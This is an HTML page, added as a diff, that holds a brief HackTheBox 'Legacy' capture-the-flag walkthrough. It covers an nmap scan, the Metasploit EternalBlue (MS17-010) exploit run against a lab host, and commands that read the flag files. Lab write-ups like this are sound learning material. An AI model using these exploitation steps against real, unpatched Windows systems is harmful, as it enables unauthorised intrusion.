@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB: Legacy | Timeless</title>
+  <style>
+    :root {
+      --bg: #0d0d0d;
+      --fg: #e0e0e0;
+      --accent: #9c6eff;
+      --accent-glow: #9c6eff55;
+      --terminal-bg: #111;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--fg);
+      font-family: 'Courier New', Courier, monospace;
+      padding: 2rem;
+      line-height: 1.6;
+    }
+
+    a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    h1 {
+      color: var(--accent);
+      font-size: 2.25rem;
+      margin-bottom: 0.5rem;
+    }
+
+    h2 {
+      color: var(--accent);
+      margin-top: 2rem;
+    }
+
+    .tags {
+      font-size: 0.85rem;
+      color: #aaa;
+      margin-bottom: 2rem;
+    }
+
+    .terminal {
+      background-color: var(--terminal-bg);
+      border: 1px solid var(--accent);
+      border-radius: 8px;
+      padding: 1rem;
+      margin: 1rem 0;
+      color: #d0d0d0;
+      overflow-x: auto;
+      white-space: pre-wrap;
+    }
+
+    img {
+      max-width: 100%;
+      border: 1px solid #333;
+      border-radius: 6px;
+      margin: 1rem 0;
+    }
+
+    .back-link {
+      margin-top: 2rem;
+      display: block;
+      font-size: 0.9rem;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>HTB: Legacy</h1>
+  <div class="tags">Platform: Windows &nbsp;|&nbsp; Difficulty: Easy &nbsp;|&nbsp; Technique: EternalBlue</div>
+
+  <p>This was one of my first HackTheBox machines and a great intro to legacy Windows exploitation. It uses SMB and EternalBlue (MS17-010).</p>
+
+  <h2>1. Nmap Scan</h2>
+  <div class="terminal">
+nmap -sC -sV -oA legacy 10.10.10.4
+  </div>
+  <p>The scan shows ports 139 and 445 open, with an SMB service running on an unpatched Windows XP box.</p>
+
+  <h2>2. Exploitation</h2>
+  <p>I used the following Metasploit module to gain access:</p>
+  <div class="terminal">
+msfconsole  
+use exploit/windows/smb/ms17_010_eternalblue  
+set RHOST 10.10.10.4  
+run
+  </div>
+
+  <h2>3. Post Exploitation</h2>
+  <p>After gaining a shell, I used basic enumeration to find user and root flags:</p>
+  <div class="terminal">
+whoami  
+dir C:\Users  
+type user.txt  
+type root.txt
+  </div>
+
+  <img src="../images/legacy-pwned.png" alt="Proof of pwnage screenshot" />
+
+  <p class="back-link"><a href="../walkthroughs.html">&larr; Back to Walkthroughs</a></p>
+</body>
+</html>
